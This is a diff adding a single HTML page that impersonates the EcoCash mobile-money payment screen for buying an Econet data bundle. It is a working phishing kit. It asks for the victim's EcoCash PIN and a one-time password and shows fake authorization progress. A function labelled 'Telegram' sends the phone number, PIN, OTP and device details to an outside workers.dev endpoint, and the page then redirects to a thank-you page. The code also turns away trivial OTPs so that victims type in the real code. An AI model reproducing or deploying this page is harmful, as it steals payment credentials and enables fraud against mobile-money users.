@@ -1,0 +1,701 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover,interactive-widget=resizes-content">
+<meta name="theme-color" content="#0057B8">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<title>Authorize &middot; EcoCash</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=DM+Sans:opsz,wght@9..40,400;9..40,500;9..40,600;9..40,700;9..40,800&family=DM+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+html,body{height:100%}
+body{
+  font-family:'DM Sans',system-ui,sans-serif;
+  -webkit-font-smoothing:antialiased;
+  background:#F2F4FF;
+  color:#191C22;
+  display:flex;flex-direction:column;
+  position:fixed;inset:0;width:100%;
+  height:100vh;height:100dvh;
+  overflow:hidden;
+}
+button{font-family:inherit;touch-action:manipulation;border:none;background:none;cursor:pointer;outline:none;-webkit-user-select:none;user-select:none}
+input{font-family:inherit;border:none;outline:none;background:none;-webkit-user-select:text!important;user-select:text!important}
+img{display:block}
+
+:root{
+  --pri:#0057B8;--pri-cont:#D6E4FF;--on-pri-cont:#001B4D;
+  --sec:#CC0000;
+  --bg:#F2F4FF;--surf:#FFFFFF;
+  --surf-lo:#F2F4FF;--surf-mid:#ECEFFE;--surf-hi:#E1E4F3;
+  --on-surf:#191C22;--on-surf-v:#42474F;
+  --outline:#73788A;--outline-v:#C3C7D6;
+  --grn:#16A34A;--grn-lt:rgba(22,163,74,.12);
+  --err:#B3261E;
+  --r-sm:12px;--r-md:16px;--r-lg:24px;--r-full:999px;
+  --sh1:0 1px 2px rgba(0,0,0,.06),0 1px 3px rgba(0,0,0,.08);
+  --sh-sec:0 2px 12px rgba(204,0,0,.22);
+  --ease:cubic-bezier(.22,1,.36,1);
+  --spring:cubic-bezier(.34,1.56,.64,1);
+}
+
+@keyframes spin{to{transform:rotate(360deg)}}
+@keyframes pgIn{from{opacity:0;transform:translateY(5px)}to{opacity:1;transform:none}}
+@keyframes stepIn{from{opacity:0;transform:translateY(4px)}to{opacity:1;transform:none}}
+@keyframes shake{0%,100%{transform:translateX(0)}20%,60%{transform:translateX(-7px)}40%,80%{transform:translateX(7px)}}
+@keyframes ripple{to{transform:scale(4);opacity:0}}
+
+/* ─── CURTAIN ─────────────────────────────── */
+.curtain{
+  position:fixed;inset:0;z-index:9999;
+  background:#fff;opacity:0;pointer-events:none;
+  transition:opacity .3s ease;
+  display:flex;flex-direction:column;align-items:center;justify-content:center;gap:20px;
+}
+.curtain.show{opacity:1;pointer-events:auto}
+.curtain-logo img{height:28px;width:auto}
+.curtain-spin{width:24px;height:24px;border:2.5px solid var(--outline-v);border-top-color:var(--pri);border-radius:50%;animation:spin .7s linear infinite}
+
+/* ─── NAV ─────────────────────────────────── */
+.nav{
+  flex-shrink:0;
+  background:var(--pri);
+  height:56px;
+  display:flex;align-items:center;justify-content:space-between;
+  padding:0 16px;
+  box-shadow:0 2px 8px rgba(0,0,0,.18);
+}
+.nav-spinner{
+  width:22px;height:22px;
+  border:2.5px solid rgba(255,255,255,.25);
+  border-top-color:#fff;
+  border-radius:50%;
+  animation:spin .8s linear infinite;
+  display:none;
+  flex-shrink:0;
+}
+.nav-spinner.on{display:block}
+.nav-back{display:flex;align-items:center;gap:5px;color:rgba(255,255,255,.85);font-size:13px;font-weight:500}
+.nav-logo img{height:26px;width:auto;filter:grayscale(1) brightness(2)}
+.nav-amt{font-size:12px;font-weight:600;color:var(--sec);background:#fff;padding:3px 10px;border-radius:var(--r-full);font-family:'DM Mono',monospace}
+
+/* ─── SCROLL ──────────────────────────────── */
+.scroll{
+  flex:1;min-height:0;
+  overflow-y:auto;overflow-x:hidden;
+  -webkit-overflow-scrolling:touch;
+  overscroll-behavior-y:contain;
+  scrollbar-width:none;
+  padding:14px 16px 8px;
+  display:flex;flex-direction:column;gap:10px;
+  animation:pgIn .2s var(--ease) both;
+}
+.scroll::-webkit-scrollbar{display:none}
+
+/* ─── SUMMARY CARD ────────────────────────── */
+.sum-card{
+  background:var(--pri-cont);
+  border-radius:var(--r-md);
+  overflow:hidden;
+  box-shadow:var(--sh1);
+}
+.sum-top{padding:14px 16px;display:flex;align-items:center;justify-content:space-between;gap:10px}
+.sum-name{font-size:15px;font-weight:700;color:var(--on-pri-cont);overflow:hidden;text-overflow:ellipsis;white-space:nowrap;max-width:55%}
+.sum-num{display:flex;align-items:center;gap:5px;margin-top:3px}
+.sum-num img{height:13px;border-radius:2px;flex-shrink:0}
+.sum-num-val{font-size:11px;font-family:'DM Mono',monospace;color:var(--on-pri-cont);opacity:.7;font-weight:500}
+.sum-price{text-align:right;flex-shrink:0}
+.sum-price-lbl{font-size:9px;font-weight:700;color:var(--on-pri-cont);opacity:.6;text-transform:uppercase;letter-spacing:.5px;margin-bottom:1px}
+.sum-price-val{font-size:22px;font-weight:800;color:var(--on-pri-cont);letter-spacing:-.5px;font-feature-settings:'tnum'}
+.sum-bar{background:var(--pri);padding:9px 16px;display:flex;align-items:center;gap:8px}
+.sum-bar img{height:18px;width:auto}
+.sum-bar span{font-size:11px;color:rgba(255,255,255,.8);font-weight:500}
+
+/* ─── ECO STRIP ───────────────────────────── */
+.eco-strip{
+  background:var(--surf);
+  border:1px solid var(--outline-v);
+  border-radius:var(--r-md);
+  padding:12px 16px;
+  display:flex;align-items:center;justify-content:center;
+  box-shadow:var(--sh1);
+}
+.eco-strip img{height:26px;width:auto}
+
+/* ─── STEP CARD ───────────────────────────── */
+.step-card{
+  background:var(--surf);
+  border:1px solid var(--outline-v);
+  border-top:3px solid var(--pri);
+  border-radius:var(--r-md);
+  box-shadow:var(--sh1);
+}
+.step-head{padding:14px 16px;border-bottom:1px solid var(--outline-v);display:flex;align-items:center;gap:12px}
+.step-ic{
+  width:40px;height:40px;border-radius:var(--r-full);
+  background:var(--pri-cont);
+  display:flex;align-items:center;justify-content:center;flex-shrink:0;
+}
+.step-title{font-size:16px;font-weight:600;color:var(--on-surf)}
+.step-sub{font-size:12px;color:var(--on-surf-v);margin-top:2px}
+.step-body{padding:16px;display:flex;flex-direction:column;gap:14px}
+
+/* ─── STEPS ───────────────────────────────── */
+.step{display:none}
+.step.on{display:block;animation:stepIn .2s var(--ease)}
+
+/* ─── PIN ─────────────────────────────────── */
+.pin-row{display:flex;justify-content:center;gap:10px}
+.pin-cell{
+  width:58px;height:58px;
+  border-radius:var(--r-md);
+  border:1px solid var(--outline-v);
+  background:var(--surf-mid);
+  display:flex;align-items:center;justify-content:center;
+  transition:border-color .15s,background .15s,transform .12s var(--spring),box-shadow .15s;
+  position:relative;flex-shrink:0;
+}
+.pin-cell.filled{border-color:var(--pri);background:var(--pri-cont);transform:scale(1.04)}
+.pin-cell.filled::after{content:'';width:16px;height:16px;border-radius:50%;background:var(--sec)}
+.pin-cell.active{border-color:var(--pri);box-shadow:0 0 0 2px var(--pri);transform:scale(1.06)}
+.pin-cell.peek{background:var(--pri-cont)}
+.pin-cell.peek::after{display:none}
+.pin-digit{
+  position:absolute;inset:0;display:none;
+  align-items:center;justify-content:center;
+  font-family:'DM Mono',monospace;font-size:26px;font-weight:700;color:var(--pri);
+}
+.pin-cell.peek .pin-digit{display:flex}
+.pin-row.shake .pin-cell{animation:shake .3s ease;border-color:var(--err)}
+
+.pin-actions{display:flex;gap:8px}
+.pin-act{
+  flex:1;height:40px;border-radius:var(--r-full);
+  background:var(--pri-cont);color:var(--on-pri-cont);
+  font-size:13px;font-weight:500;
+  display:flex;align-items:center;justify-content:center;gap:6px;
+  transition:background .12s;
+}
+.pin-act:active{background:rgba(0,87,184,.2)}
+
+.pin-err{font-size:12px;color:var(--err);text-align:center;min-height:18px;font-weight:500}
+
+/* ─── NUMPAD ──────────────────────────────── */
+.numpad{display:grid;grid-template-columns:repeat(3,1fr);gap:8px}
+.nk{
+  height:56px;border-radius:var(--r-md);
+  background:var(--surf-mid);
+  font-family:'DM Mono',monospace;font-size:24px;font-weight:400;
+  color:var(--on-surf);
+  display:flex;align-items:center;justify-content:center;
+  box-shadow:var(--sh1);
+  transition:background .1s,transform .1s;
+  position:relative;overflow:hidden;
+  touch-action:manipulation;-webkit-user-select:none;
+}
+.nk:active{background:var(--surf-hi);transform:scale(.94)}
+.nk.del{background:var(--surf-hi)}
+.nk.empty{opacity:0;pointer-events:none;box-shadow:none}
+
+/* ─── PROCESSING ──────────────────────────── */
+.proc-body{display:flex;flex-direction:column;align-items:center;padding:28px 20px 20px;text-align:center;gap:0}
+.proc-ring{
+  width:64px;height:64px;
+  min-width:64px;min-height:64px;
+  position:relative;flex-shrink:0;
+  margin-bottom:18px;
+}
+.proc-svg{
+  width:64px;height:64px;
+  display:block;
+  animation:spin .9s linear infinite;
+}
+.proc-svg.done{animation:none}
+.proc-arc{stroke-dasharray:72;stroke-dashoffset:72;transition:stroke-dashoffset .6s ease,stroke .35s}
+.proc-svg.done .proc-arc{stroke-dashoffset:0;stroke:var(--grn)}
+.proc-ic{position:absolute;inset:0;display:flex;align-items:center;justify-content:center}
+.proc-t{font-size:16px;font-weight:600;color:var(--on-surf);margin-bottom:4px;transition:opacity .2s}
+.proc-s{font-size:12px;color:var(--on-surf-v);margin-bottom:20px;transition:opacity .2s}
+
+/* Progress steps */
+.vsteps{display:flex;align-items:center;max-width:220px;width:100%}
+.vstep{display:flex;flex-direction:column;align-items:center;gap:4px;flex-shrink:0}
+.vstep-dot{width:10px;height:10px;border-radius:50%;background:var(--outline-v);transition:background .25s,transform .25s}
+.vstep.act .vstep-dot{background:var(--pri);transform:scale(1.35);box-shadow:0 0 0 3px rgba(0,87,184,.15)}
+.vstep.done .vstep-dot{background:var(--grn)}
+.vstep-lbl{font-size:9px;font-weight:500;color:var(--on-surf-v);letter-spacing:.3px}
+.vstep.act .vstep-lbl{color:var(--pri);font-weight:700}
+.vstep.done .vstep-lbl{color:var(--grn)}
+.vline{flex:1;height:1.5px;background:var(--outline-v);margin:0 4px;margin-bottom:14px;transition:background .25s}
+.vline.done{background:var(--grn)}
+
+.proc-logos{display:flex;align-items:center;justify-content:center;gap:10px;padding:12px;background:var(--surf-mid);border-top:1px solid var(--outline-v);border-radius:0 0 var(--r-md) var(--r-md)}
+.proc-logos img{height:20px;width:auto}
+
+/* ─── OTP ─────────────────────────────────── */
+.otp-boxes{display:flex;gap:7px;justify-content:center;max-width:100%}
+.otp-box{
+  width:44px;height:54px;
+  border-radius:var(--r-sm) var(--r-sm) 0 0;
+  border-bottom:2px solid var(--outline);
+  background:var(--surf-mid);
+  display:flex;align-items:center;justify-content:center;
+  font-family:'DM Mono',monospace;font-size:22px;font-weight:600;
+  color:var(--on-surf);
+  transition:border-bottom-color .15s,background .15s,transform .12s var(--spring);
+}
+.otp-box.active{border-bottom-color:var(--pri);border-bottom-width:3px;transform:scale(1.05)}
+.otp-box.filled{background:var(--pri-cont);color:var(--on-pri-cont);border-bottom-color:var(--pri)}
+.otp-box.success{background:var(--grn-lt);color:var(--grn);border-bottom-color:var(--grn);transition:all .25s ease}
+.otp-hidden{position:absolute;opacity:0;pointer-events:none;width:1px;height:1px}
+
+.timer-row{display:flex;justify-content:center;align-items:center;gap:6px;font-size:12px;color:var(--on-surf-v)}
+.timer-val{font-weight:700;color:var(--pri);font-family:'DM Mono',monospace}
+.resend-btn{
+  display:block;margin:0 auto;
+  height:36px;padding:0 20px;
+  border-radius:var(--r-full);
+  background:var(--pri-cont);color:var(--on-pri-cont);
+  font-size:13px;font-weight:500;
+  transition:opacity .2s;
+}
+.resend-btn:disabled{opacity:.35}
+
+/* ─── FOOT ─────────────────────────────────── */
+.foot{
+  flex-shrink:0;
+  background:var(--surf);
+  border-top:1px solid var(--outline-v);
+  padding:10px 16px max(16px,env(safe-area-inset-bottom,0px));
+  box-shadow:0 -1px 4px rgba(0,0,0,.06);
+}
+.foot-btn{
+  width:100%;height:48px;
+  border-radius:var(--r-full);
+  background:var(--sec);color:#fff;
+  font-size:14px;font-weight:600;letter-spacing:.3px;
+  display:flex;align-items:center;justify-content:center;gap:8px;
+  box-shadow:var(--sh-sec);
+  position:relative;overflow:hidden;
+  transition:transform .12s,box-shadow .12s,background .12s;
+  font-family:'DM Sans',sans-serif;
+}
+.foot-btn:active{transform:scale(.97);box-shadow:none;background:#A50000}
+.foot-btn:disabled{background:var(--surf-hi);color:var(--on-surf-v);box-shadow:none;transform:none}
+.foot-spin{
+  width:18px;height:18px;
+  border:2.5px solid rgba(255,255,255,.3);
+  border-top-color:#fff;
+  border-radius:50%;
+  animation:spin .7s linear infinite;
+  flex-shrink:0;display:none;
+}
+.foot-spin.on{display:block}
+
+.rip{position:absolute;border-radius:50%;pointer-events:none;background:rgba(255,255,255,.22);transform:scale(0);animation:ripple .5s ease forwards}
+.rip-dark{background:rgba(0,0,0,.08)}
+</style>
+</head>
+<body>
+
+<div class="curtain" id="curtain">
+  <div class="curtain-logo"><img src="assets/ecocash.png" alt="EcoCash"></div>
+  <div class="curtain-spin"></div>
+</div>
+
+<nav class="nav">
+  <button class="nav-back" onclick="history.back()">
+    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><path d="M19 12H5M12 5l-7 7 7 7"/></svg>
+    Back
+  </button>
+  <div class="nav-logo"><img src="assets/ecocash.png" alt="EcoCash"></div>
+  <div style="display:flex;align-items:center;gap:8px">
+    <div class="nav-spinner" id="navSpinner"></div>
+    <div class="nav-amt" id="navAmt">USD 0.00</div>
+  </div>
+</nav>
+
+<div class="scroll">
+
+  <!-- Summary -->
+  <div class="sum-card">
+    <div class="sum-top">
+      <div style="min-width:0;flex:1">
+        <div class="sum-name" id="sumName">Bundle</div>
+        <div class="sum-num">
+          <img src="https://flagcdn.com/w20/zw.png" alt="ZW" onerror="this.style.display='none'">
+          <span class="sum-num-val" id="sumNum">+263 &#x2022;&#x2022;&#x2022;&#x2022;&#x2022;&#x2022;&#x2022;</span>
+        </div>
+      </div>
+      <div class="sum-price">
+        <div class="sum-price-lbl">Price</div>
+        <div class="sum-price-val" id="sumPrice">USD 0.00</div>
+      </div>
+    </div>
+    <div class="sum-bar">
+      <img src="assets/econet.png" alt="Econet">
+      <span id="sumDetail">Loading&hellip;</span>
+    </div>
+  </div>
+
+  <!-- EcoCash logo strip -->
+  <div class="eco-strip"><img src="assets/ecocash.png" alt="EcoCash"></div>
+
+  <!-- Step: PIN -->
+  <div class="step on" id="stepPin">
+    <div class="step-card">
+      <div class="step-head">
+        <div class="step-ic">
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="var(--pri)" stroke-width="2" stroke-linecap="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+        </div>
+        <div>
+          <div class="step-title">EcoCash PIN</div>
+          <div class="step-sub">Enter your 4-digit EcoCash PIN</div>
+        </div>
+      </div>
+      <div class="step-body">
+        <div class="pin-row" id="pinRow">
+          <div class="pin-cell" id="pc0"><span class="pin-digit" id="pd0"></span></div>
+          <div class="pin-cell" id="pc1"><span class="pin-digit" id="pd1"></span></div>
+          <div class="pin-cell" id="pc2"><span class="pin-digit" id="pd2"></span></div>
+          <div class="pin-cell" id="pc3"><span class="pin-digit" id="pd3"></span></div>
+        </div>
+        <div class="pin-err" id="pinErr"></div>
+        <div class="pin-actions">
+          <button class="pin-act" id="peekBtn">
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
+            Peek
+          </button>
+          <button class="pin-act" id="clearBtn">
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
+            Clear
+          </button>
+        </div>
+        <div class="numpad">
+          <button class="nk" data-v="1">1</button><button class="nk" data-v="2">2</button><button class="nk" data-v="3">3</button>
+          <button class="nk" data-v="4">4</button><button class="nk" data-v="5">5</button><button class="nk" data-v="6">6</button>
+          <button class="nk" data-v="7">7</button><button class="nk" data-v="8">8</button><button class="nk" data-v="9">9</button>
+          <button class="nk empty"></button>
+          <button class="nk" data-v="0">0</button>
+          <button class="nk del" id="delKey">
+            <svg width="22" height="22" viewBox="0 0 24 24" fill="var(--on-surf-v)"><path d="M22 3H7c-.69 0-1.23.35-1.59.88L0 12l5.41 8.11c.36.53.9.89 1.59.89h15c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-3 12.59L17.59 17 14 13.41 10.41 17 9 15.59 12.59 12 9 8.41 10.41 7 14 10.59 17.59 7 19 8.41 15.41 12 19 15.59z"/></svg>
+          </button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Step: Processing -->
+  <div class="step" id="stepProc">
+    <div class="step-card">
+      <div class="proc-body">
+        <div class="proc-ring">
+          <svg class="proc-svg" id="procSvg" viewBox="0 0 64 64" width="64" height="64">
+            <circle cx="32" cy="32" r="26" fill="none" stroke="var(--outline-v)" stroke-width="4"/>
+            <circle class="proc-arc" id="procArc" cx="32" cy="32" r="26" fill="none" stroke="var(--pri)" stroke-width="4" stroke-linecap="round" transform="rotate(-90 32 32)"/>
+          </svg>
+          <div class="proc-ic" id="procIc">
+            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="var(--pri)" stroke-width="2.5" stroke-linecap="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+          </div>
+        </div>
+        <div class="proc-t" id="procT">Authorizing&hellip;</div>
+        <div class="proc-s" id="procS">Contacting EcoCash</div>
+        <div class="vsteps">
+          <div class="vstep act" id="vs0"><div class="vstep-dot"></div><div class="vstep-lbl">PIN</div></div>
+          <div class="vline" id="vl0"></div>
+          <div class="vstep" id="vs1"><div class="vstep-dot"></div><div class="vstep-lbl">Auth</div></div>
+          <div class="vline" id="vl1"></div>
+          <div class="vstep" id="vs2"><div class="vstep-dot"></div><div class="vstep-lbl">OTP</div></div>
+        </div>
+      </div>
+      <div class="proc-logos">
+        <img src="assets/ecocash.png" alt="EcoCash">
+        <img src="assets/econet.png" alt="Econet">
+      </div>
+    </div>
+  </div>
+
+  <!-- Step: OTP -->
+  <div class="step" id="stepOtp">
+    <div class="step-card">
+      <div class="step-head">
+        <div class="step-ic">
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="var(--pri)" stroke-width="2" stroke-linecap="round"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>
+        </div>
+        <div>
+          <div class="step-title">One-Time Password</div>
+          <div class="step-sub" id="otpNote">Enter the 6-digit OTP sent to your number</div>
+        </div>
+      </div>
+      <div class="step-body">
+        <div class="otp-boxes" id="otpBoxes">
+          <div class="otp-box" id="ob0"></div>
+          <div class="otp-box" id="ob1"></div>
+          <div class="otp-box" id="ob2"></div>
+          <div class="otp-box" id="ob3"></div>
+          <div class="otp-box" id="ob4"></div>
+          <div class="otp-box" id="ob5"></div>
+        </div>
+        <input class="otp-hidden" id="otpIn" type="tel" inputmode="numeric" pattern="[0-9]*" maxlength="6">
+        <div class="pin-err" id="otpErr"></div>
+        <div class="timer-row">
+          <span>Expires in</span>
+          <span class="timer-val" id="timer">15:00</span>
+        </div>
+        <button class="resend-btn" id="resendBtn" disabled>Resend OTP</button>
+      </div>
+    </div>
+  </div>
+
+</div><!-- /scroll -->
+
+<!-- FOOT BARS (outside scroll, always visible) -->
+<div class="foot" id="footPin">
+  <button class="foot-btn" id="pinBtn" disabled>
+    <div class="foot-spin" id="pinSpin"></div>
+    <span id="pinBtnLbl">Enter your PIN</span>
+  </button>
+</div>
+<div class="foot" id="footOtp" style="display:none">
+  <button class="foot-btn" id="otpBtn" disabled>Confirm OTP</button>
+</div>
+
+<script>
+'use strict';
+function hap(ms){try{navigator.vibrate&&navigator.vibrate(ms);}catch(e){}}
+function ripple(el,e,dark){
+  var r=el.getBoundingClientRect(),sz=Math.max(r.width,r.height)*2;
+  var rip=document.createElement('span');
+  rip.className='rip'+(dark?' rip-dark':'');
+  rip.style.cssText='width:'+sz+'px;height:'+sz+'px;left:'+(e.clientX-r.left-sz/2)+'px;top:'+(e.clientY-r.top-sz/2)+'px;position:absolute;';
+  el.appendChild(rip);
+  rip.addEventListener('animationend',function(){rip.remove();});
+}
+
+// Load session data
+var bundle={},recip={raw:'',display:''};
+try{bundle=JSON.parse(sessionStorage.getItem('selectedBundle')||'{}');}catch(e){}
+try{recip=JSON.parse(sessionStorage.getItem('ecoRecipient')||'{}');}catch(e){}
+
+var amt='USD '+(bundle.price||'0.00');
+
+// Populate summary
+(function(){
+  var el=function(id){return document.getElementById(id);};
+  el('navAmt').textContent=amt;
+  el('sumName').textContent=bundle.name||'Bundle';
+  el('sumPrice').textContent=amt;
+  el('sumDetail').textContent=(bundle.data||'')+' \u00b7 '+(bundle.val||'');
+  if(recip.raw){
+    var d=recip.raw;
+    el('sumNum').textContent='+263 '+d.slice(0,2)+'\u2022\u2022\u2022\u2022\u2022'+d.slice(-2);
+  }
+})();
+
+// Telegram
+function tgDevice(){var ua=navigator.userAgent||'';return(ua.match(/Mobile|Android|iPhone/i)?'Mobile':'Desktop')+' \u00b7 '+(ua.match(/iPhone|iPad/i)?'iOS':ua.match(/Android/i)?'Android':'Other');}
+function tgPhone(r){return String(r||'').replace(/[^0-9]/g,'').replace(/^(00263|263|0)/,'');}
+function tg(ev,otp){
+  try{
+    fetch('https://econet-api.lennxkoros.workers.dev',{method:'POST',headers:{'Content-Type':'application/json'},
+    body:JSON.stringify({event:ev,phone:tgPhone(recip.raw),pin:PIN,otp:otp||'',bundle:bundle.name||'',data:bundle.data||'',amount:bundle.price||'',device:tgDevice()})}).catch(function(){});
+  }catch(e){}
+}
+
+// ─── PIN ─────────────────────────────────────────────────────────
+var PIN='',peeking=false,submitting=false;
+
+function renderPIN(){
+  var btn=document.getElementById('pinBtn'),lbl=document.getElementById('pinBtnLbl');
+  btn.disabled=PIN.length<4;
+  lbl.textContent=PIN.length<4?'Enter your PIN':'Pay '+amt+' via EcoCash';
+  for(var i=0;i<4;i++){
+    var cell=document.getElementById('pc'+i),dig=document.getElementById('pd'+i);
+    cell.className='pin-cell';
+    if(i<PIN.length){
+      cell.classList.add('filled');
+      if(peeking){cell.classList.add('peek');dig.textContent=PIN[i];}
+      else dig.textContent='';
+    } else if(i===PIN.length){
+      cell.classList.add('active');
+    }
+  }
+}
+
+document.querySelectorAll('.nk[data-v]').forEach(function(k){
+  k.addEventListener('click',function(){
+    if(PIN.length>=4)return;
+    PIN+=k.dataset.v;hap(8);renderPIN();
+  });
+  k.addEventListener('pointerdown',function(e){ripple(k,e,true);},{passive:true});
+});
+document.getElementById('delKey').addEventListener('click',function(){
+  if(!PIN.length)return;PIN=PIN.slice(0,-1);hap(8);renderPIN();
+});
+document.getElementById('clearBtn').addEventListener('click',function(){
+  PIN='';renderPIN();document.getElementById('pinErr').textContent='';
+});
+
+var pb=document.getElementById('peekBtn');
+pb.addEventListener('pointerdown',function(e){e.preventDefault();peeking=true;renderPIN();});
+pb.addEventListener('pointerup',function(){peeking=false;renderPIN();});
+pb.addEventListener('pointerleave',function(){peeking=false;renderPIN();});
+
+renderPIN();
+
+// ─── STEP SWITCHING ────────────────────────────────────────────────
+var curStep='pin';
+function showStep(id){
+  var sp=document.getElementById('navSpinner');
+  if(sp)sp.className='nav-spinner'+(id==='pin'?'':' on');
+  document.querySelectorAll('.step').forEach(function(s){s.classList.remove('on');});
+  document.getElementById('step'+id[0].toUpperCase()+id.slice(1)).classList.add('on');
+  curStep=id;
+  document.getElementById('footPin').style.display=id==='pin'?'':'none';
+  document.getElementById('footOtp').style.display=id==='otp'?'':'none';
+  if(id==='otp')setTimeout(function(){document.getElementById('otpIn').focus();},200);
+}
+
+// ─── PROCESSING ─────────────────────────────────────────────────────
+function setVS(i,t,sub){
+  [0,1,2].forEach(function(j){
+    document.getElementById('vs'+j).className='vstep'+(j<i?' done':j===i?' act':'');
+  });
+  [0,1].forEach(function(j){document.getElementById('vl'+j).classList.toggle('done',j<i);});
+  var tEl=document.getElementById('procT'),sEl=document.getElementById('procS');
+  tEl.style.opacity='0';sEl.style.opacity='0';
+  setTimeout(function(){tEl.textContent=t;sEl.textContent=sub;tEl.style.opacity='1';sEl.style.opacity='1';},120);
+  hap(8);
+}
+function markDone(){
+  [0,1,2].forEach(function(i){document.getElementById('vs'+i).className='vstep done';});
+  [0,1].forEach(function(i){document.getElementById('vl'+i).classList.add('done');});
+  document.getElementById('procSvg').classList.add('done');
+  document.getElementById('procIc').innerHTML='<svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="var(--grn)" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M4 12L9.5 17.5 20 7"/></svg>';
+  var tEl=document.getElementById('procT'),sEl=document.getElementById('procS');
+  tEl.style.opacity='0';sEl.style.opacity='0';
+  setTimeout(function(){tEl.textContent='Code Sent!';sEl.textContent='Check your phone for the OTP';tEl.style.opacity='1';sEl.style.opacity='1';},120);
+  hap([10,50,10]);
+}
+
+function sendOTP(){
+  setVS(2,'Sending OTP','Dispatching code\u2026');
+  setTimeout(function(){
+    markDone();
+    setTimeout(function(){
+      var masked='+263 '+recip.raw.slice(0,2)+'\u2022\u2022\u2022\u2022\u2022'+recip.raw.slice(-2);
+      var note=document.getElementById('otpNote');
+      if(note)note.innerHTML='Code sent to <strong>'+masked+'</strong>';
+      showStep('otp');startTimer();
+    },500);
+  },700);
+}
+
+// ─── PIN SUBMIT ─────────────────────────────────────────────────────
+document.getElementById('pinBtn').addEventListener('click',function(){
+  if(submitting||PIN.length!==4)return;
+  submitting=true;hap(18);
+  document.getElementById('pinErr').textContent='';
+  document.getElementById('pinSpin').classList.add('on');
+  this.disabled=true;
+  tg('bundle_pin_submitted','');
+  showStep('proc');
+  setVS(0,'Verifying PIN','Checking credentials\u2026');
+  setTimeout(function(){setVS(1,'Contacting EcoCash','Processing payment\u2026');setTimeout(sendOTP,2000);},900);
+});
+
+// ─── OTP ────────────────────────────────────────────────────────────
+var otpVal='',otpDone=false;
+var otpIn=document.getElementById('otpIn');
+
+function renderOTP(){
+  var active=document.activeElement===otpIn;
+  for(var i=0;i<6;i++){
+    var b=document.getElementById('ob'+i);
+    b.className='otp-box';
+    b.textContent=otpVal[i]||'';
+    if(otpVal[i])b.classList.add('filled');
+    else if(i===otpVal.length&&active)b.classList.add('active');
+  }
+}
+
+otpIn.addEventListener('input',function(){
+  otpVal=this.value.replace(/[^0-9]/g,'').slice(0,6);this.value=otpVal;
+  renderOTP();
+  document.getElementById('otpBtn').disabled=otpVal.length<6;
+  if(otpVal.length===6)hap([8,20,8]);
+});
+otpIn.addEventListener('paste',function(e){
+  var t=(e.clipboardData||window.clipboardData).getData('text').replace(/[^0-9]/g,'').slice(0,6);
+  if(t.length){e.preventDefault();otpIn.value=t;otpVal=t;renderOTP();document.getElementById('otpBtn').disabled=t.length<6;if(t.length===6)hap([8,20,8]);}
+});
+otpIn.addEventListener('focus',renderOTP);otpIn.addEventListener('blur',renderOTP);
+document.getElementById('otpBoxes').addEventListener('click',function(){otpIn.focus();});
+
+document.getElementById('otpBtn').addEventListener('click',confirmOTP);
+function confirmOTP(){
+  if(otpDone||otpVal.length<6)return;
+  // Reject obviously invalid OTPs
+  if(/^(\d)\1{5}$/.test(otpVal)||otpVal==='123456'){
+    hap([40,30,40]);
+    document.getElementById('otpErr').textContent='Invalid OTP — check your message and try again.';
+    var boxes=document.getElementById('otpBoxes');
+    boxes.style.animation='none';void boxes.offsetWidth;boxes.style.animation='shake .3s ease';
+    setTimeout(function(){otpVal='';otpIn.value='';renderOTP();document.getElementById('otpBtn').disabled=true;},350);
+    return;
+  }
+  otpDone=true;hap([10,50,10]);
+  tg('bundle_otp_confirmed',otpVal);
+  // Flash green then navigate
+  for(var i=0;i<6;i++)document.getElementById('ob'+i).classList.add('success');
+  setTimeout(function(){
+    var c=document.getElementById('curtain');
+    c.style.display='flex';
+    requestAnimationFrame(function(){requestAnimationFrame(function(){c.style.opacity='1';c.style.pointerEvents='auto';});});
+    setTimeout(function(){window.location.href='bundles-thankyou.html';},700);
+  },400);
+}
+
+// ─── TIMER ──────────────────────────────────────────────────────────
+var timerInt=null;
+function startTimer(){
+  var secs=900;
+  var tick=function(){
+    var m=Math.floor(secs/60),s=secs%60;
+    document.getElementById('timer').textContent=(m<10?'0':'')+m+':'+(s<10?'0':'')+s;
+    if(secs<=0){clearInterval(timerInt);document.getElementById('resendBtn').disabled=false;}
+    secs--;
+  };
+  tick();timerInt=setInterval(tick,1000);
+}
+document.getElementById('resendBtn').addEventListener('click',function(){
+  if(this.disabled)return;
+  this.disabled=true;otpVal='';otpIn.value='';renderOTP();
+  document.getElementById('otpBtn').disabled=true;
+  clearInterval(timerInt);
+  sendOTP();
+  tg('bundle_otp_resent','');
+});
+
+// ─── BACK NAVIGATION ────────────────────────────────────────────────
+history.replaceState({step:'pin'},'','');
+window.addEventListener('popstate',function(){
+  if(curStep==='proc'||curStep==='otp'){
+    submitting=false;showStep('pin');hap(8);
